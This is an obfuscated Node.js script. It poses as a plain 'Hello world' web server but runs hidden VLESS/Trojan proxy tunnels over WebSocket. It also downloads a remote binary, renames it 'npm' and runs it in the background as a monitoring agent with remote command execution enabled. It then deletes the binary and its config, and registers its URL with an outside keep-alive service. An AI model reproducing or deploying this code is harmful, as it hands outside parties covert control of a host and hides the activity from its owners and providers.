const _0x37d3d7=_0x2d32;(function(_0x21365d,_0x5770fc){const _0x18418a=_0x2d32,_0x39bada=_0x21365d();while(!![]){try{const _0xb8de15=-parseInt(_0x18418a(0x1ba))/0x1+parseInt(_0x18418a(0x160))/0x2*(-parseInt(_0x18418a(0x16c))/0x3)+-parseInt(_0x18418a(0x1a3))/0x4*(-parseInt(_0x18418a(0x1a0))/0x5)+parseInt(_0x18418a(0x180))/0x6+parseInt(_0x18418a(0x17c))/0x7+-parseInt(_0x18418a(0x166))/0x8+parseInt(_0x18418a(0x1a8))/0x9;if(_0xb8de15===_0x5770fc)break;else _0x39bada['push'](_0x39bada['shift']());}catch(_0x2f18b7){_0x39bada['push'](_0x39bada['shift']());}}}(_0x6e66,0xc25fd));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x37d3d7(0x172)),net=require(_0x37d3d7(0x1a7)),path=require(_0x37d3d7(0x1c5)),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require(_0x37d3d7(0x1b7)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0x37d3d7(0x17b),NEZHA_SERVER=process[_0x37d3d7(0x162)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x37d3d7(0x162)][_0x37d3d7(0x1b0)]||'',NEZHA_KEY=process['env'][_0x37d3d7(0x18c)]||'',DOMAIN=process[_0x37d3d7(0x162)][_0x37d3d7(0x1b8)]||'1234.abc.com',AUTO_ACCESS=process[_0x37d3d7(0x162)][_0x37d3d7(0x195)]||![],WSPATH=process[_0x37d3d7(0x162)]['WSPATH']||UUID[_0x37d3d7(0x198)](0x0,0x8),SUB_PATH=process['env'][_0x37d3d7(0x19a)]||'sub',NAME=process['env'][_0x37d3d7(0x1c8)]||'',PORT=process[_0x37d3d7(0x162)][_0x37d3d7(0x1c4)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x10a8bf=_0x37d3d7;try{const _0x29d1c6=await axios[_0x10a8bf(0x16f)]('https://speed.cloudflare.com/meta'),_0x5282a0=_0x29d1c6['data'];ISP=(_0x5282a0['country']+'-'+_0x5282a0[_0x10a8bf(0x184)])[_0x10a8bf(0x1b3)](/ /g,'_');}catch(_0x2dc2a7){ISP=_0x10a8bf(0x1a5);}};GetISP();const httpServer=http[_0x37d3d7(0x1ad)]((_0x1da584,_0x5b50ca)=>{const _0x305ae4=_0x37d3d7;if(_0x1da584[_0x305ae4(0x1b2)]==='/'){const _0x12d319=path[_0x305ae4(0x189)](__dirname,_0x305ae4(0x1af));fs[_0x305ae4(0x190)](_0x12d319,_0x305ae4(0x1d3),(_0x19b66e,_0x145f31)=>{const _0x1a8f27=_0x305ae4;if(_0x19b66e){_0x5b50ca[_0x1a8f27(0x15b)](0xc8,{'Content-Type':'text/html'}),_0x5b50ca[_0x1a8f27(0x1cf)](_0x1a8f27(0x1b9));return;}_0x5b50ca[_0x1a8f27(0x15b)](0xc8,{'Content-Type':_0x1a8f27(0x1bc)}),_0x5b50ca[_0x1a8f27(0x1cf)](_0x145f31);});return;}else{if(_0x1da584['url']==='/'+SUB_PATH){const _0x46a5cc=NAME?NAME+'-'+ISP:ISP,_0x552f93=_0x305ae4(0x17e)+UUID+'@'+DOMAIN+_0x305ae4(0x167)+DOMAIN+_0x305ae4(0x1a9)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x46a5cc,_0x20bc0c=_0x305ae4(0x1d1)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x305ae4(0x1a9)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x46a5cc,_0x24a49a=_0x552f93+'\x0a'+_0x20bc0c,_0x8c07ce=Buffer[_0x305ae4(0x1bd)](_0x24a49a)[_0x305ae4(0x192)](_0x305ae4(0x1ac));_0x5b50ca[_0x305ae4(0x15b)](0xc8,{'Content-Type':_0x305ae4(0x1a4)}),_0x5b50ca[_0x305ae4(0x1cf)](_0x8c07ce+'\x0a');}else _0x5b50ca[_0x305ae4(0x15b)](0x194,{'Content-Type':_0x305ae4(0x1a4)}),_0x5b50ca['end'](_0x305ae4(0x15e));}}),wss=new WebSocket[(_0x37d3d7(0x1cd))]({'server':httpServer}),uuid=UUID[_0x37d3d7(0x1b3)](/-/g,''),DNS_SERVERS=[_0x37d3d7(0x191),_0x37d3d7(0x17f)];function resolveHost(_0x3673a2){return new Promise((_0x4bcadf,_0xa9e551)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x3673a2)){_0x4bcadf(_0x3673a2);return;}let _0x28a5b9=0x0;function _0x3c9ed8(){const _0x59c018=_0x2d32;if(_0x28a5b9>=DNS_SERVERS['length']){_0xa9e551(new Error(_0x59c018(0x17a)+_0x3673a2+_0x59c018(0x19d)));return;}const _0x4cc6f9=DNS_SERVERS[_0x28a5b9];_0x28a5b9++;const _0x93e800=_0x59c018(0x1d2)+encodeURIComponent(_0x3673a2)+_0x59c018(0x1a1);axios[_0x59c018(0x16f)](_0x93e800,{'timeout':0x1388,'headers':{'Accept':_0x59c018(0x1cc)}})['then'](_0x38c05e=>{const _0x7a0023=_0x59c018,_0x58052b=_0x38c05e[_0x7a0023(0x199)];if(_0x58052b[_0x7a0023(0x173)]===0x0&&_0x58052b[_0x7a0023(0x18a)]&&_0x58052b['Answer'][_0x7a0023(0x171)]>0x0){const _0x19379f=_0x58052b[_0x7a0023(0x18a)][_0x7a0023(0x161)](_0x3bd14c=>_0x3bd14c['type']===0x1);if(_0x19379f){_0x4bcadf(_0x19379f[_0x7a0023(0x199)]);return;}}_0x3c9ed8();})[_0x59c018(0x188)](_0x2f52bd=>{_0x3c9ed8();});}_0x3c9ed8();});}function _0x2d32(_0x534639,_0x42c6d4){const _0x6e6640=_0x6e66();return _0x2d32=function(_0x2d3284,_0x52b8d7){_0x2d3284=_0x2d3284-0x15b;let _0xa17a52=_0x6e6640[_0x2d3284];return _0xa17a52;},_0x2d32(_0x534639,_0x42c6d4);}function handleVlessConnection(_0x38697d,_0x4e6980){const _0xd7f0d8=_0x37d3d7,[_0x4ddb5a]=_0x4e6980,_0x584ce4=_0x4e6980[_0xd7f0d8(0x198)](0x1,0x11);if(!_0x584ce4['every']((_0x206478,_0x1fee45)=>_0x206478==parseInt(uuid[_0xd7f0d8(0x1ae)](_0x1fee45*0x2,0x2),0x10)))return![];let _0x48e036=_0x4e6980[_0xd7f0d8(0x198)](0x11,0x12)['readUInt8']()+0x13;const _0x5018ce=_0x4e6980[_0xd7f0d8(0x198)](_0x48e036,_0x48e036+=0x2)[_0xd7f0d8(0x170)](0x0),_0x85b72d=_0x4e6980['slice'](_0x48e036,_0x48e036+=0x1)[_0xd7f0d8(0x168)](),_0x240c1a=_0x85b72d==0x1?_0x4e6980[_0xd7f0d8(0x198)](_0x48e036,_0x48e036+=0x4)[_0xd7f0d8(0x189)]('.'):_0x85b72d==0x2?new TextDecoder()[_0xd7f0d8(0x15f)](_0x4e6980[_0xd7f0d8(0x198)](_0x48e036+0x1,_0x48e036+=0x1+_0x4e6980['slice'](_0x48e036,_0x48e036+0x1)['readUInt8']())):_0x85b72d==0x3?_0x4e6980[_0xd7f0d8(0x198)](_0x48e036,_0x48e036+=0x10)[_0xd7f0d8(0x18f)]((_0x5d3d8e,_0x4d218b,_0x53fa4b,_0x4f2789)=>_0x53fa4b%0x2?_0x5d3d8e[_0xd7f0d8(0x1c7)](_0x4f2789[_0xd7f0d8(0x198)](_0x53fa4b-0x1,_0x53fa4b+0x1)):_0x5d3d8e,[])[_0xd7f0d8(0x187)](_0x884d0d=>_0x884d0d[_0xd7f0d8(0x170)](0x0)['toString'](0x10))[_0xd7f0d8(0x189)](':'):'';_0x38697d['send'](new Uint8Array([_0x4ddb5a,0x0]));const _0x979ddc=createWebSocketStream(_0x38697d);return resolveHost(_0x240c1a)[_0xd7f0d8(0x183)](_0x4e7eaa=>{const _0x37f384=_0xd7f0d8;net[_0x37f384(0x179)]({'host':_0x4e7eaa,'port':_0x5018ce},function(){const _0x14c5f4=_0x37f384;this[_0x14c5f4(0x18e)](_0x4e6980['slice'](_0x48e036)),_0x979ddc['on'](_0x14c5f4(0x178),()=>{})[_0x14c5f4(0x1ab)](this)['on'](_0x14c5f4(0x178),()=>{})['pipe'](_0x979ddc);})['on'](_0x37f384(0x178),()=>{});})['catch'](_0x277a96=>{const _0x4edc48=_0xd7f0d8;net[_0x4edc48(0x179)]({'host':_0x240c1a,'port':_0x5018ce},function(){const _0x4f04ab=_0x4edc48;this['write'](_0x4e6980['slice'](_0x48e036)),_0x979ddc['on'](_0x4f04ab(0x178),()=>{})['pipe'](this)['on'](_0x4f04ab(0x178),()=>{})[_0x4f04ab(0x1ab)](_0x979ddc);})['on'](_0x4edc48(0x178),()=>{});}),!![];}function _0x6e66(){const _0x1eb9fc=['text/html','from','trim','npm\x20is\x20running','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','arm','unlink','PORT','path','Server\x20is\x20running\x20on\x20port\x20','concat','NAME','config.yaml','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','https://arm64.ssss.nyc.mn/v1','application/dns-json','Server','close','end','once','trojan://','https://dns.google/resolve?name=','utf8','writeFileSync','writeHead','update','post','Not\x20Found\x0a','decode','4soUtCG','find','env','createWriteStream','https://amd64.ssss.nyc.mn/v1','hex','11907112qWrMzg',':443?encryption=none&security=tls&sni=','readUInt8','2053','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','createHash','1423182uQVLNq','/bin/bash','2083','get','readUInt16BE','length','axios','Status','8443','true','https://','client_secret:\x20','error','connect','Failed\x20to\x20resolve\x20','5efabea4-f6d4-91fd-b8f0-17e004c89c60','9897328FFxkll','sha224','vless://','1.1.1.1','3709890DzEXvd','2096','arm64','then','asOrganization','arch','npm\x20download\x20successfully','map','catch','join','Answer','Automatic\x20Access\x20Task\x20added\x20successfully','NEZHA_KEY','connection','write','reduce','readFile','8.8.4.4','toString','log','https://amd64.ssss.nyc.mn/agent','AUTO_ACCESS','setsid\x20nohup\x20./npm\x20-s\x20','pop','slice','data','SUB_PATH','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','false','\x20with\x20all\x20DNS\x20servers','2087','npm','1070wcgXJj','&type=A','aarch64','8FeTMKQ','text/plain','Unknown','https://arm64.ssss.nyc.mn/agent','net','23352192bkwQuh','&fp=chrome&type=ws&host=','listen','pipe','base64','createServer','substr','index.html','NEZHA_PORT','includes','url','replace','every','npm\x20running\x20error:','split','child_process','DOMAIN','Hello\x20world!','1394001SdHEaF','error:\x20'];_0x6e66=function(){return _0x1eb9fc;};return _0x6e66();}function handleTrojanConnection(_0x2d0d91,_0x512db5){const _0x298993=_0x37d3d7;try{if(_0x512db5[_0x298993(0x171)]<0x3a)return![];const _0x41c4e5=_0x512db5[_0x298993(0x198)](0x0,0x38)['toString'](),_0x525b9e=[UUID];let _0x1851c8=null;for(const _0x33ceec of _0x525b9e){const _0x1fb664=crypto[_0x298993(0x16b)](_0x298993(0x17d))[_0x298993(0x15c)](_0x33ceec)['digest'](_0x298993(0x165));if(_0x1fb664===_0x41c4e5){_0x1851c8=_0x33ceec;break;}}if(!_0x1851c8)return![];let _0x3a5acd=0x38;_0x512db5[_0x3a5acd]===0xd&&_0x512db5[_0x3a5acd+0x1]===0xa&&(_0x3a5acd+=0x2);const _0x4ddd15=_0x512db5[_0x3a5acd];if(_0x4ddd15!==0x1)return![];_0x3a5acd+=0x1;const _0x2fd01e=_0x512db5[_0x3a5acd];_0x3a5acd+=0x1;let _0x119a6f,_0x2daa76;if(_0x2fd01e===0x1)_0x119a6f=_0x512db5[_0x298993(0x198)](_0x3a5acd,_0x3a5acd+0x4)[_0x298993(0x189)]('.'),_0x3a5acd+=0x4;else{if(_0x2fd01e===0x3){const _0x56712a=_0x512db5[_0x3a5acd];_0x3a5acd+=0x1,_0x119a6f=_0x512db5[_0x298993(0x198)](_0x3a5acd,_0x3a5acd+_0x56712a)[_0x298993(0x192)](),_0x3a5acd+=_0x56712a;}else{if(_0x2fd01e===0x4)_0x119a6f=_0x512db5[_0x298993(0x198)](_0x3a5acd,_0x3a5acd+0x10)[_0x298993(0x18f)]((_0x577ee7,_0x1f947d,_0x196342,_0x1e938c)=>_0x196342%0x2?_0x577ee7[_0x298993(0x1c7)](_0x1e938c[_0x298993(0x198)](_0x196342-0x1,_0x196342+0x1)):_0x577ee7,[])[_0x298993(0x187)](_0x5e45ca=>_0x5e45ca['readUInt16BE'](0x0)['toString'](0x10))[_0x298993(0x189)](':'),_0x3a5acd+=0x10;else return![];}}_0x2daa76=_0x512db5[_0x298993(0x170)](_0x3a5acd),_0x3a5acd+=0x2;_0x3a5acd<_0x512db5[_0x298993(0x171)]&&_0x512db5[_0x3a5acd]===0xd&&_0x512db5[_0x3a5acd+0x1]===0xa&&(_0x3a5acd+=0x2);const _0x2426d1=createWebSocketStream(_0x2d0d91);return resolveHost(_0x119a6f)[_0x298993(0x183)](_0x124e16=>{const _0x59cac3=_0x298993;net[_0x59cac3(0x179)]({'host':_0x124e16,'port':_0x2daa76},function(){const _0x471a1f=_0x59cac3;_0x3a5acd<_0x512db5['length']&&this[_0x471a1f(0x18e)](_0x512db5[_0x471a1f(0x198)](_0x3a5acd)),_0x2426d1['on']('error',()=>{})[_0x471a1f(0x1ab)](this)['on']('error',()=>{})[_0x471a1f(0x1ab)](_0x2426d1);})['on'](_0x59cac3(0x178),()=>{});})[_0x298993(0x188)](_0x1c1869=>{const _0xabf483=_0x298993;net[_0xabf483(0x179)]({'host':_0x119a6f,'port':_0x2daa76},function(){const _0x4600b7=_0xabf483;_0x3a5acd<_0x512db5[_0x4600b7(0x171)]&&this['write'](_0x512db5[_0x4600b7(0x198)](_0x3a5acd)),_0x2426d1['on']('error',()=>{})[_0x4600b7(0x1ab)](this)['on'](_0x4600b7(0x178),()=>{})['pipe'](_0x2426d1);})['on'](_0xabf483(0x178),()=>{});}),!![];}catch(_0x5a242b){return![];}}wss['on'](_0x37d3d7(0x18d),(_0x55146c,_0x44a2ee)=>{const _0x28448d=_0x37d3d7,_0x1b1c06=_0x44a2ee['url']||'';_0x55146c[_0x28448d(0x1d0)]('message',_0x5d952d=>{const _0x19a8b6=_0x28448d;if(_0x5d952d[_0x19a8b6(0x171)]>0x11&&_0x5d952d[0x0]===0x0){const _0x27b611=_0x5d952d[_0x19a8b6(0x198)](0x1,0x11),_0x464e7e=_0x27b611[_0x19a8b6(0x1b4)]((_0x3370a8,_0x2c7728)=>_0x3370a8==parseInt(uuid['substr'](_0x2c7728*0x2,0x2),0x10));if(_0x464e7e){!handleVlessConnection(_0x55146c,_0x5d952d)&&_0x55146c[_0x19a8b6(0x1ce)]();return;}}!handleTrojanConnection(_0x55146c,_0x5d952d)&&_0x55146c[_0x19a8b6(0x1ce)]();})['on'](_0x28448d(0x178),()=>{});});const getDownloadUrl=()=>{const _0x5c4932=_0x37d3d7,_0x210dba=os[_0x5c4932(0x185)]();return _0x210dba===_0x5c4932(0x1c2)||_0x210dba===_0x5c4932(0x182)||_0x210dba===_0x5c4932(0x1a2)?!NEZHA_PORT?_0x5c4932(0x1cb):_0x5c4932(0x1a6):!NEZHA_PORT?_0x5c4932(0x164):_0x5c4932(0x194);},downloadFile=async()=>{const _0xe357ef=_0x37d3d7;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x565752=getDownloadUrl(),_0xad7131=await axios({'method':_0xe357ef(0x16f),'url':_0x565752,'responseType':'stream'}),_0x2962ef=fs[_0xe357ef(0x163)]('npm');return _0xad7131[_0xe357ef(0x199)][_0xe357ef(0x1ab)](_0x2962ef),new Promise((_0x49ff68,_0x378d52)=>{const _0x20314e=_0xe357ef;_0x2962ef['on']('finish',()=>{const _0x37da05=_0x2d32;console[_0x37da05(0x193)](_0x37da05(0x186)),exec('chmod\x20+x\x20npm',_0x3a6535=>{if(_0x3a6535)_0x378d52(_0x3a6535);_0x49ff68();});}),_0x2962ef['on'](_0x20314e(0x178),_0x378d52);});}catch(_0x280e2b){throw _0x280e2b;}},runnz=async()=>{const _0x85eb60=_0x37d3d7;try{const _0x957e8f=execSync(_0x85eb60(0x1ca),{'encoding':'utf-8'});if(_0x957e8f[_0x85eb60(0x1be)]()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x685b19){}await downloadFile();let _0xe7b6cf='',_0xc5323=['443',_0x85eb60(0x174),_0x85eb60(0x181),_0x85eb60(0x19e),_0x85eb60(0x16e),_0x85eb60(0x169)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x500fa5=_0xc5323['includes'](NEZHA_PORT)?'--tls':'';_0xe7b6cf=_0x85eb60(0x196)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x500fa5+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x13138f=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x85eb60(0x1b6)](':')[_0x85eb60(0x197)]():'',_0x1196de=_0xc5323[_0x85eb60(0x1b1)](_0x13138f)?_0x85eb60(0x175):_0x85eb60(0x19c),_0x29324a=_0x85eb60(0x177)+NEZHA_KEY+_0x85eb60(0x19b)+NEZHA_SERVER+_0x85eb60(0x1c0)+_0x1196de+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x85eb60(0x1d4)](_0x85eb60(0x1c9),_0x29324a);}_0xe7b6cf=_0x85eb60(0x16a);}else{console['log'](_0x85eb60(0x1c1));return;}}try{exec(_0xe7b6cf,{'shell':_0x85eb60(0x16d)},_0x2b293f=>{const _0xdc051d=_0x85eb60;if(_0x2b293f)console[_0xdc051d(0x178)](_0xdc051d(0x1b5),_0x2b293f);else console['log'](_0xdc051d(0x1bf));});}catch(_0x31e365){console['error'](_0x85eb60(0x1bb)+_0x31e365);}};async function addAccessTask(){const _0x514064=_0x37d3d7;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x39b63c=_0x514064(0x176)+DOMAIN+'/'+SUB_PATH;try{const _0x274b4c=await axios[_0x514064(0x15d)]('https://oooo.serv00.net/add-url',{'url':_0x39b63c},{'headers':{'Content-Type':'application/json'}});console['log'](_0x514064(0x18b));}catch(_0x35362d){}}const delFiles=()=>{const _0x3bdbf0=_0x37d3d7;fs[_0x3bdbf0(0x1c3)](_0x3bdbf0(0x19f),()=>{}),fs['unlink'](_0x3bdbf0(0x1c9),()=>{});};httpServer[_0x37d3d7(0x1aa)](PORT,()=>{const _0xd4f4c6=_0x37d3d7;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0xd4f4c6(0x1c6)+PORT);});
